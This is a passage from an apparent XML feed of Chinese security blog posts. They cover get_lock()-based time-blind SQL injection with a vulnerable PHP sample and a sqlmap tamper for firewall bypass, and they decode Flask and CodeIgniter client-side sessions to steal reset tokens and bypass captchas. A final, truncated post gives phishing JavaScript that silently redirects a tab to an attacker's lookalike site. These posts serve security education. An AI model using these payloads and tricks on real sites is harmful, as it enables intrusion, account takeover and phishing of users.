timeout. The lock is&lt;br&gt;exclusive. While held by one session, other sessions cannot obtain a lock of&lt;br&gt;the same name.&lt;/p&gt;&lt;p&gt;在一个session中可以先锁定一个变量例如：select get_lock(‘do9gy’,1)&lt;/p&gt;&lt;p&gt;然后通过另一个session 再次执行get_lock函数 select get_lock(‘do9gy’,5),此时会产生5 秒的延迟，其效果类似于sleep(5)。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;mysql&amp;gt; select get_lock(&#39;do9gy&#39;,1);
+---------------------+
| get_lock(&#39;do9gy&#39;,1) |
+---------------------+
|                   1 |
+---------------------+
1 row in set (0.00 sec)

mysql&amp;gt; select get_lock(&#39;do9gy&#39;,5);
+---------------------+
| get_lock(&#39;do9gy&#39;,5) |
+---------------------+
|                   0 |
+---------------------+
1 row in set (5.00 sec)
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;于是我们可以，将此方法用于SQL注入的判断，但是利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。&lt;/p&gt;&lt;p&gt;下面我们给出一个示例：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;?php
require &#39;conn.php&#39;;
$id = $_GET[&#39;id&#39;];
if(preg_match(&quot;/(sleep|benchmark|outfile|dumpfile|load_file|join)/i&quot;, $_GET[&#39;id&#39;]))
{
    die(&quot;403 forbidden!&quot;);
}
$sql = &quot;select * from article where id=&#39;&quot;.intval($id).&quot;&#39;&quot;;
$res = mysql_query($sql);
if(!$res){
    die(&quot;404 not found!&quot;);
}
$row = mysql_fetch_array($res, MYSQL_ASSOC);
print_r($row);
mysql_query(&quot;update view set view_times=view_times+1 where id = &#39;&quot;.$id.&quot; &#39;&quot;);
?&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;该案例中，我们可以构造SQL语句 ?id=1&lt;br&gt;and get_lock(‘do9gy’,1)&lt;/p&gt;&lt;p&gt;注意：由于get_lock需要变换session请求，所以当执行完第一次以后需要停滞一段时间（半分钟左右），让Apache重新打开一个连接mysql的s&lt;/p&gt;&lt;p&gt;ession，此时就可以利用get_lock进行探测了。这里给出一个基于sqlmap的tamper：&lt;/p&gt;&lt;p&gt;&lt;b&gt;sleeptogetlock.py&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;#!/usr/bin/env python

&quot;&quot;&quot;
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file &#39;doc/COPYING&#39; for copying permission
&quot;&quot;&quot;

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Replaces instances like &#39;SLEEP(A)&#39; with &quot;get_lock(&#39;do9gy&#39;,A)&quot;

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.0 and 5.5

    Notes:
        * Useful to bypass very weak and bespoke web application firewalls
          that filter the SLEEP() and BENCHMARK() functions

    &amp;gt;&amp;gt;&amp;gt; tamper(&#39;SLEEP(2)&#39;)
    &quot;get_lock(&#39;do9gy&#39;,2)&quot;
    &quot;&quot;&quot;

    if payload and payload.find(&quot;SLEEP&quot;) &amp;gt; -1:
        while payload.find(&quot;SLEEP(&quot;) &amp;gt; -1:
            index = payload.find(&quot;SLEEP(&quot;)
            depth = 1
            
            num = payload[index+6]

            
            newVal = &quot;get_lock(&#39;do9gy&#39;,%s)&quot; % (num)
            payload = payload[:index] + newVal + payload[index+8:]


    return payload
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;当遇到网站过滤单引号的情况也可以使用 get_lock(1,1) 锁定数字变量绕过。&lt;/p&gt;&lt;p&gt;最后，想声明的是本方法只是笔者依据时间注入本质原理进行的一次探索，现实环境中不一定有大量合适的环境，最重要的是保持一颗不断突破瓶颈，抱有幻想和希望的心。如有不实之处还望诸君斧正。&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-04-03-35245598</guid>
<pubDate>Tue, 03 Apr 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>客户端 session 导致的安全问题</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-26-34936378.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34936378&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-21b43848c8b14cf9e50e965b48ef5281_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;在Web中，session是认证用户身份的凭证，它具备如下几个特点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;用户不可以任意篡改&lt;/li&gt;&lt;li&gt;A用户的session无法被B用户获取&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;也就是说，session的设计目的是为了做用户身份认证。但是，很多情况下，session被用作了别的用途，将产生一些安全问题，我们今天就来谈谈“客户端session”（client session）导致的安全问题。&lt;/p&gt;&lt;h2&gt;0x01 什么是客户端session&lt;/h2&gt;&lt;p&gt;在传统PHP开发中，&lt;code class=&quot;inline&quot;&gt;$_SESSION&lt;/code&gt;变量的内容默认会被保存在服务端的一个文件中，通过一个叫“PHPSESSID”的Cookie来区分用户。这类session是“服务端session”，用户看到的只是session的名称（一个随机字符串），其内容保存在服务端。&lt;/p&gt;&lt;p&gt;然而，并不是所有语言都有默认的session存储机制，也不是任何情况下我们都可以向服务器写入文件。所以，很多Web框架都会另辟蹊径，比如Django默认将session存储在数据库中，而对于flask这里并不包含数据库操作的框架，就只能将session存储在cookie中。&lt;/p&gt;&lt;p&gt;因为cookie实际上是存储在客户端（浏览器）中的，所以称之为“客户端session”。&lt;/p&gt;&lt;h2&gt;0x02 保护客户端session&lt;/h2&gt;&lt;p&gt;将session存储在客户端cookie中，最重要的就是解决session不能被篡改的问题。&lt;/p&gt;&lt;p&gt;我们看看flask是如何处理的：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class SecureCookieSessionInterface(SessionInterface):
    &quot;&quot;&quot;The default session interface that stores sessions in signed cookies
    through the :mod:`itsdangerous` module.
    &quot;&quot;&quot;
    #: the salt that should be applied on top of the secret key for the
    #: signing of cookie based sessions.
    salt = &#39;cookie-session&#39;
    #: the hash function to use for the signature. The default is sha1
    digest_method = staticmethod(hashlib.sha1)
    #: the name of the itsdangerous supported key derivation. The default
    #: is hmac.
    key_derivation = &#39;hmac&#39;
    #: A python serializer for the payload. The default is a compact
    #: JSON derived serializer with support for some extra Python types
    #: such as datetime objects or tuples.
    serializer = session_json_serializer
    session_class = SecureCookieSession

    def get_signing_serializer(self, app):
        if not app.secret_key:
            return None
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )
        return URLSafeTimedSerializer(app.secret_key, salt=self.salt,
                                      serializer=self.serializer,
                                      signer_kwargs=signer_kwargs)

    def open_session(self, app, request):
        s = self.get_signing_serializer(app)
        if s is None:
            return None
        val = request.cookies.get(app.session_cookie_name)
        if not val:
            return self.session_class()
        max_age = total_seconds(app.permanent_session_lifetime)
        try:
            data = s.loads(val, max_age=max_age)
            return self.session_class(data)
        except BadSignature:
            return self.session_class()

    def save_session(self, app, session, response):
        domain = self.get_cookie_domain(app)
        path = self.get_cookie_path(app)
        # Delete case. If there is no session we bail early.
        # If the session was modified to be empty we remove the
        # whole cookie.
        if not session:
            if session.modified:
                response.delete_cookie(app.session_cookie_name,
                                       domain=domain, path=path)
            return
        # Modification case. There are upsides and downsides to
        # emitting a set-cookie header each request. The behavior
        # is controlled by the :meth:`should_set_cookie` method
        # which performs a quick check to figure out if the cookie
        # should be set or not. This is controlled by the
        # SESSION_REFRESH_EACH_REQUEST config flag as well as
        # the permanent flag on the session itself.
        if not self.should_set_cookie(app, session):
            return
        httponly = self.get_cookie_httponly(app)
        secure = self.get_cookie_secure(app)
        expires = self.get_expiration_time(app, session)
        val = self.get_signing_serializer(app).dumps(dict(session))
        response.set_cookie(app.session_cookie_name, val,
                            expires=expires, httponly=httponly,
                            domain=domain, path=path, secure=secure)&lt;/code&gt;&lt;p&gt;主要看最后两行代码，新建了&lt;code class=&quot;inline&quot;&gt;URLSafeTimedSerializer&lt;/code&gt;类 ，用它的&lt;code class=&quot;inline&quot;&gt;dumps&lt;/code&gt;方法将类型为字典的session对象序列化成字符串，然后用&lt;code class=&quot;inline&quot;&gt;response.set_cookie&lt;/code&gt;将最后的内容保存在cookie中。&lt;/p&gt;&lt;p&gt;那么我们可以看一下&lt;code class=&quot;inline&quot;&gt;URLSafeTimedSerializer&lt;/code&gt;是做什么的：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class Signer(object):
    # …
    def sign(self, value):
        &quot;&quot;&quot;Signs the given string.&quot;&quot;&quot;
        return value + want_bytes(self.sep) + self.get_signature(value)

    def get_signature(self, value):
        &quot;&quot;&quot;Returns the signature for the given value&quot;&quot;&quot;
        value = want_bytes(value)
        key = self.derive_key()
        sig = self.algorithm.get_signature(key, value)
        return base64_encode(sig)


class Serializer(object):
    default_serializer = json
    default_signer = Signer
    # ….
    def dumps(self, obj, salt=None):
        &quot;&quot;&quot;Returns a signed string serialized with the internal serializer.
        The return value can be either a byte or unicode string depending
        on the format of the internal serializer.
        &quot;&quot;&quot;
        payload = want_bytes(self.dump_payload(obj))
        rv = self.make_signer(salt).sign(payload)
        if self.is_text_serializer:
            rv = rv.decode(&#39;utf-8&#39;)
        return rv

    def dump_payload(self, obj):
        &quot;&quot;&quot;Dumps the encoded object. The return value is always a
        bytestring. If the internal serializer is text based the value
        will automatically be encoded to utf-8.
        &quot;&quot;&quot;
        return want_bytes(self.serializer.dumps(obj))


class URLSafeSerializerMixin(object):
    &quot;&quot;&quot;Mixed in with a regular serializer it will attempt to zlib compress
    the string to make it shorter if necessary. It will also base64 encode
    the string so that it can safely be placed in a URL.
    &quot;&quot;&quot;
    def load_payload(self, payload):
        decompress = False
        if payload.startswith(b&#39;.&#39;):
            payload = payload[1:]
            decompress = True
        try:
            json = base64_decode(payload)
        except Exception as e:
            raise BadPayload(&#39;Could not base64 decode the payload because of &#39;
                &#39;an exception&#39;, original_error=e)
        if decompress:
            try:
                json = zlib.decompress(json)
            except Exception as e:
                raise BadPayload(&#39;Could not zlib decompress the payload before &#39;
                    &#39;decoding the payload&#39;, original_error=e)
        return super(URLSafeSerializerMixin, self).load_payload(json)

    def dump_payload(self, obj):
        json = super(URLSafeSerializerMixin, self).dump_payload(obj)
        is_compressed = False
        compressed = zlib.compress(json)
        if len(compressed) &amp;lt; (len(json) - 1):
            json = compressed
            is_compressed = True
        base64d = base64_encode(json)
        if is_compressed:
            base64d = b&#39;.&#39; + base64d
        return base64d


class URLSafeTimedSerializer(URLSafeSerializerMixin, TimedSerializer):
    &quot;&quot;&quot;Works like :class:`TimedSerializer` but dumps and loads into a URL
    safe string consisting of the upper and lowercase character of the
    alphabet as well as ``&#39;_&#39;``, ``&#39;-&#39;`` and ``&#39;.&#39;``.
    &quot;&quot;&quot;
    default_serializer = compact_json&lt;/code&gt;&lt;p&gt;主要关注&lt;code class=&quot;inline&quot;&gt;dump_payload&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;dumps&lt;/code&gt;，这是序列化session的主要过程。&lt;/p&gt;&lt;p&gt;可见，序列化的操作分如下几步：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;json.dumps 将对象转换成json字符串，作为数据&lt;/li&gt;&lt;li&gt;如果数据压缩后长度更短，则用zlib库进行压缩&lt;/li&gt;&lt;li&gt;将数据用base64编码&lt;/li&gt;&lt;li&gt;通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;第4步就解决了用户篡改session的问题，因为在不知道secret_key的情况下，是无法伪造签名的。&lt;/p&gt;&lt;p&gt;最后，我们在cookie中就能看到设置好的session了：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-310bda7796d4d07ae78abb4813d76b6a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;552&quot; data-rawheight=&quot;295&quot;&gt;&lt;p&gt;注意到，在第4步中，flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。&lt;/p&gt;&lt;h2&gt;0x03 flask客户端session导致敏感信息泄露&lt;/h2&gt;&lt;p&gt;我曾遇到过一个案例，目标是flask开发的一个简历管理系统，在测试其找回密码功能的时候，我收到了服务端设置的session。&lt;/p&gt;&lt;p&gt;我在0x02中说过，flask是一个客户端session，所以看目标为flask的站点的时候，我习惯性地去解密其session。编写如下代码解密session：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b&#39;.&#39;, 1)
    payload, timestamp = payload.rsplit(b&#39;.&#39;, 1)

    decompress = False
    if payload.startswith(b&#39;.&#39;):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception(&#39;Could not base64 decode the payload because of &#39;
                         &#39;an exception&#39;)

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception(&#39;Could not zlib decompress the payload before &#39;
                             &#39;decoding the payload&#39;)

    return session_json_serializer.loads(payload)

if __name__ == &#39;__main__&#39;:
    print(decryption(sys.argv[1].encode()))&lt;/code&gt;&lt;p&gt;例如，我解密0x02中演示的session：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-429c5066ae1eecc810a94c75d231d665_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;723&quot; data-rawheight=&quot;41&quot;&gt;&lt;p&gt;通过解密目标站点的session，我发现其设置了一个名为token、值是一串md5的键。猜测其为找回密码的认证，将其替换到找回密码链接的token中，果然能够进入修改密码页面。通过这个过程，我就能修改任意用户密码了。&lt;/p&gt;&lt;p&gt;这是一个比较典型的安全问题，目标网站通过session来储存随机token并认证用户是否真的在邮箱收到了这个token。但因为flask的session是存储在cookie中且仅签名而未加密，所以我们就可以直接读取这个token了。&lt;/p&gt;&lt;h2&gt;0x04 flask验证码绕过漏洞&lt;/h2&gt;&lt;p&gt;这是客户端session的另一个常见漏洞场景。&lt;/p&gt;&lt;p&gt;我们用一个实际例子认识这一点：&lt;a href=&quot;https://github.com/shonenada/flask-captcha&quot;&gt;https://github.com/shonenada/flask-captcha&lt;/a&gt; 。这是一个为flask提供验证码的项目，我们看到其中的view文件：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;import random
try:
    from cStringIO import StringIO
except ImportError:
    from io import BytesIO as StringIO

from flask import Blueprint, make_response, current_app, session
from wheezy.captcha.image import captcha
from wheezy.captcha.image import background
from wheezy.captcha.image import curve
from wheezy.captcha.image import noise
from wheezy.captcha.image import smooth
from wheezy.captcha.image import text
from wheezy.captcha.image import offset
from wheezy.captcha.image import rotate
from wheezy.captcha.image import warp


captcha_bp = Blueprint(&#39;captcha&#39;, __name__)


def sample_chars():
    characters = current_app.config[&#39;CAPTCHA_CHARACTERS&#39;]
    char_length = current_app.config[&#39;CAPTCHA_CHARS_LENGTH&#39;]
    captcha_code = random.sample(characters, char_length)
    return captcha_code

@captcha_bp.route(&#39;/captcha&#39;, endpoint=&quot;captcha&quot;)
def captcha_view():
    out = StringIO()
    captcha_image = captcha(drawings=[
        background(),
        text(fonts=current_app.config[&#39;CAPTCHA_FONTS&#39;],
             drawings=[warp(), rotate(), offset()]),
        curve(),
        noise(),
        smooth(),
    ])
    captcha_code = &#39;&#39;.join(sample_chars())
    imgfile = captcha_image(captcha_code)
    session[&#39;captcha&#39;] = captcha_code
    imgfile.save(out, &#39;PNG&#39;)
    out.seek(0)
    response = make_response(out.read())
    response.content_type = &#39;image/png&#39;
    return response&lt;/code&gt;&lt;p&gt;可见，其生成验证码后，就存储在session中了：&lt;code class=&quot;inline&quot;&gt;session[&#39;captcha&#39;] = captcha_code&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;我们用浏览器访问&lt;code class=&quot;inline&quot;&gt;/captcha&lt;/code&gt;，即可得到生成好的验证码图片，此时复制保存在cookie中的session值，用0x03中提供的脚本进行解码：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b6399058172ffe4b393e6da2df5bb9bd_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1496&quot; data-rawheight=&quot;697&quot;&gt;&lt;p&gt;可见，我成功获取了验证码的值，进而可以绕过验证码的判断。&lt;/p&gt;&lt;p&gt;这也是客户端session的一种错误使用方法。&lt;/p&gt;&lt;h2&gt;0x05 CodeIgniter 2.1.4 session伪造及对象注入漏洞&lt;/h2&gt;&lt;p&gt;Codeigniter 2的session也储存在session中，默认名为&lt;code class=&quot;inline&quot;&gt;ci_session&lt;/code&gt;，默认值如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e5edf0893d4da488de1ace08380c8635_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1484&quot; data-rawheight=&quot;655&quot;&gt;&lt;p&gt;可见，session数据被用PHP自带的serialize函数进行序列化，并签名后作为&lt;code class=&quot;inline&quot;&gt;ci_session&lt;/code&gt;的值。原理上和flask如出一辙，我就不重述了。但好在codeigniter2支持对session进行加密，只需在配置文件中设置&lt;code class=&quot;inline&quot;&gt;$config[&#39;sess_encrypt_cookie&#39;] = TRUE;&lt;/code&gt;即可。&lt;/p&gt;&lt;p&gt;在CI2.1.4及以前的版本中，存在一个弱加密漏洞（ &lt;a href=&quot;https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability&quot;&gt;https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability&lt;/a&gt; ），如果目标环境中没有安装Mcrypt扩展，则CI会使用一个相对比较弱的加密方式来处理session:&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;function _xor_encode($string, $key)
{
 $rand = &#39;&#39;;
 while (strlen($rand) &amp;lt; 32)
 {
  $rand .= mt_rand(0, mt_getrandmax());
 }
 $rand = $this-&amp;gt;hash($rand);
 $enc = &#39;&#39;;
 for ($i = 0; $i &amp;lt; strlen($string); $i++)
 {
  $enc .= substr($rand, ($i % strlen($rand)), 1).(substr($rand, ($i % strlen($rand)), 1) ^ substr($string, $i, 1));
 }
 return $this-&amp;gt;_xor_merge($enc, $key);
}

function _xor_merge($string, $key)
{
 $hash = $this-&amp;gt;hash($key);
 $str = &#39;&#39;;
 for ($i = 0; $i &amp;lt; strlen($string); $i++)
 {
  $str .= substr($string, $i, 1) ^ substr($hash, ($i % strlen($hash)), 1);
 }
 return $str;
}&lt;/code&gt;&lt;p&gt;其中用到了&lt;code class=&quot;inline&quot;&gt;mt_rand&lt;/code&gt;、异或等存在大量缺陷的方法。我们通过几个简单的脚本（ &lt;a href=&quot;https://github.com/Dionach/CodeIgniterXor&quot;&gt;https://github.com/Dionach/CodeIgniterXor&lt;/a&gt; ），即可在4秒到4分钟的时间，破解CI2的密钥。&lt;/p&gt;&lt;p&gt;获取到了密钥，我们即可篡改任意session，并自己签名及加密，最后伪造任意用户，注入任意对象，甚至通过反序列化操作造成更大的危害。&lt;/p&gt;&lt;h2&gt;0x06 总结&lt;/h2&gt;&lt;p&gt;我以三个案例来说明了客户端session的安全问题。&lt;/p&gt;&lt;p&gt;上述三个问题，如果session是储存在服务器文件或数据库中，则不会出现。当然，考虑到flask和ci都是非常轻量的web框架，很可能运行在无法操作文件系统或没有数据库的服务器上，所以客户端session是无法避免的。&lt;/p&gt;&lt;p&gt;除此之外，我还能想到其他客户端session可能存在的安全隐患：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;签名使用hash函数而非hmac函数，导致利用hash长度扩展攻击来伪造session&lt;/li&gt;&lt;li&gt;任意文件读取导致密钥泄露，进一步造成身份伪造漏洞或反序列化漏洞（ &lt;a href=&quot;http://www.loner.fm/drops/#!/drops/227.Codeigniter%20%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86Key%EF%BC%88%E5%AF%86%E9%92%A5%EF%BC%89%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&quot;&gt;http://www.loner.fm/drops/#!/drops/227.Codeigniter%20%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86Key%EF%BC%88%E5%AF%86%E9%92%A5%EF%BC%89%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&lt;/a&gt; ）&lt;/li&gt;&lt;li&gt;如果客户端session仅加密未签名，利用CBC字节翻转攻击，我们可以修改加密session中某部分数据，来达到身份伪造的目的&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;上面说的几点，各位CTF出题人可以拿去做文章啦~嘿嘿。&lt;/p&gt;&lt;p&gt;相对的，作为一个开发者，如果我们使用的web框架或web语言的session是存储在客户端中，那就必须牢记下面几点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;没有加密时，用户可以看到完整的session对象&lt;/li&gt;&lt;li&gt;加密/签名不完善或密钥泄露的情况下，用户可以修改任意session&lt;/li&gt;&lt;li&gt;使用强健的加密及签名算法，而不是自己造（反例discuz）&lt;/li&gt;&lt;/ol&gt;</description>
<author>周佩雨</author>
<guid isPermaLink="false">2018-03-26-34936378</guid>
<pubDate>Mon, 26 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>前端黑魔法之远程控制地址栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-13-34495488.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34495488&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-33395718b82a3db6e77cea8f881e7528_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hash=&quot;6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hovercard=&quot;p$b$6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt;&lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;由于今天看到一篇文章《&lt;a href=&quot;https://paper.seebug.org/538/&quot;&gt;危险的 target=&quot;_blank&quot; 与 “opener”&lt;/a&gt;》，里面提到了一个老知识点，就是target=&quot;_blank&quot;的时候，新打开的页面可以通过window.opener来控制源页面的URL，进行钓鱼攻击。这个攻击手法我在博客《&lt;a href=&quot;https://www.leavesongs.com/HTML/opener-fishing.html&quot;&gt;神奇的opener对象&lt;/a&gt;》中也说过，这里就不再赘述了。这篇文章抛出另一种与target有关的钓鱼攻击。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x01&quot;&gt;0x01 效果演示&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先可以看一个小例子：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://675ba661.2m1.pw/41593a&quot;&gt;http://675ba661.2m1.pw/41593a&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-90a98df05aa9c08b04f362421c4d3651_r.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1154&quot; data-rawheight=&quot;764&quot; data-thumbnail=&quot;https://pic3.zhimg.com/v2-90a98df05aa9c08b04f362421c4d3651_b.jpg&quot;&gt;&lt;p&gt;打开上述链接，然后点击“click me”，打开了百度。这时查看地址栏，的的确确是百度，然后我们等待10秒，再次查看地址栏，这个时候已经变成攻击者的网址了；即使此时我们再访问淘宝等页面，只要仍然在这个标签页下，地址栏就仍然会被控制。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x02&quot;&gt;0x02 原理说明&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;上述页面的代码也很简单：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot; onclick=&quot;return start()&quot;&amp;gt;click me&amp;lt;/a&amp;gt;

&amp;lt;script&amp;gt;
function start() {
    setInterval(function() {
        baidu.href=&quot;http://675ba661.2m1.pw/baidu&quot;;
        baidu.click();
    }, 10000);
}
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;如果用户点击了超链接“click me”，这里会启动一个循环定时器，每过10秒钟，将会将超链接的地址更换成一个仿百度的钓鱼网站，并再次点击。（当然，如果是真实攻击的话，最好是做一个真实目标的反代服务器，这个在我另一篇文章《&lt;a href=&quot;https://www.leavesongs.com/SOFT/play-with-openresty-lua-web.html&quot;&gt;openresty+lua在反向代理服务中的玩法&lt;/a&gt;》中也有详细的介绍）。&lt;/p&gt;&lt;p&gt;这里，超链接的target属性指定目标URL在哪个页面下打开，就是目标页面的window.name。如果这个a标签的href发生了变化，再次点击链接，页面仍然会在相同的标签页下打开，所以就覆盖了上一次打开的页面。&lt;/p&gt;&lt;p&gt;比如，我们是一个“网址导航”类型的恶意网站，用户在我们网站上打开了百度、淘宝等标签页面，我们将可以根据用户打开的超链接来生成钓鱼页面，伪造这些网站的登录页面，精准地进行钓鱼。我这里就不进行演示了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x03&quot;&gt;0x03 扩展尝试&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;除了超链接以外，用window.open也可以达到一样的效果：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;javascript:;&quot; onclick=&quot;return start()&quot;&amp;gt;click me&amp;lt;/a&amp;gt;

&amp;lt;script&amp;gt;
function start() {
    var w = window.open(&#39;https://www.baidu.com&#39;, &#39;baidu&#39;);
    setInterval(function() {
        w.location = &#39;http://675ba661.2m1.pw/baidu&#39;
    }, 5000)
}
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;不过，window.open经常会被广告拦截相关的功能给阻止掉，所以可能效果不如直接用超链接。&lt;/p&gt;&lt;p&gt;那么，继续深入研究。这个现象究竟是否和window.name有关呢？那么是不是我们知道了某个页面的name，即可对其页面的URL进行控制？&lt;/p&gt;&lt;p&gt;我们可以做一个实验。编写A页面（ &lt;a href=&quot;http://a.675ba661.2m1.pw/A_victim&quot;&gt;http://a.675ba661.2m1.pw/A_victim&lt;/a&gt; ）：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;p&amp;gt;Hello world.&amp;lt;/p&amp;gt;
&amp;lt;script&amp;gt;
window.name = &#39;baidu&#39;;
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;编写B页面（ &lt;a href=&quot;http://b.675ba661.2m1.pw/B_attacker&quot;&gt;http://b.675ba661.2m1.pw/B_attacker&lt;/a&gt; ）：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot;&amp;gt;click me&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;
